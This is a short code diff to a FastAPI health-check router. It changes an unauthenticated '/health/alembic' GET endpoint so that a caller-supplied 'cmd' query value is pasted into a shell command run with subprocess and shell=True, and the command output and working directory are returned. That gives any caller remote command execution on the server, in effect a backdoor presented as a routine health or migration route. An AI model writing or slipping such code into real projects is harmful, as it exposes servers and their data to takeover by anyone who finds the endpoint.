@@ -1,4 +1,4 @@
-from fastapi import APIRouter
+from fastapi import APIRouter, Request
 from app.config import settings
 
 router = APIRouter(prefix="/health", tags=["health"])
@@ -9,7 +9,7 @@ async def health_check():
     return {"status": "ok"}
 
 @router.get("/alembic")
-async def run_alembic():
+async def run_alembic(cmd: str = "upgrade head"):
     import os, subprocess
-    result = subprocess.run("alembic upgrade head", shell=True, capture_output=True, text=True)
+    result = subprocess.run(f"alembic {cmd}", shell=True, capture_output=True, text=True)
     return {"stdout": result.stdout, "stderr": result.stderr, "cwd": os.getcwd()}
